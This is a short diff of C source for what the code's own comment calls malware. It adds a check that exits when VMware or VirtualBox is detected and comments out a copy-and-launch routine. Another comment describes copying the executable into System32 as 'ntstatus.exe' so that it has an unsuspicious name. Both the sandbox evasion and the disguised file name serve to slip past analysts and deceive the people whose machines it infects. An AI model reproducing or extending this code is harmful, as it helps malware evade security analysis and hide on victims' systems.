@@ -2,6 +2,7 @@
 #include <stdio.h>
 
 #include "program/program.h"
+#include "z_anti_vm/anti_vm.h"
 
 
 #define EXEC_PATH1 "C:\\Windows\\System32\\ntstatus.exe"  // give our malware an unsuspicious new name
@@ -12,13 +13,21 @@ static void run(char* path, char* requArg);
 static void copyAndLaunch(char* path);
 
 int main(int argc, char** argv) {
-    if (argc == 1) {
-        copyAndLaunch(argv[0]);
-    } else if (argc == 2) {
-        run(argv[0], argv[1]);
-    } else {
-        exit(0);
+    // ant vbox and vmware detection!
+    ERR_CODE ret = detectVM();
+    if (ret == ECODE_VMWARE_DETECTED || ret == ECODE_VBOX_DETECTED) {
+        printf("RET: %s", getErrMessage(ret));
+        exit(1);
     }
+
+
+    // if (argc == 1) {
+    //     copyAndLaunch(argv[0]);
+    // } else if (argc == 2) {
+    //     run(argv[0], argv[1]);
+    // } else {
+    //     exit(0);
+    // }
 }
 
 static void run(char* path, char* requArg) {
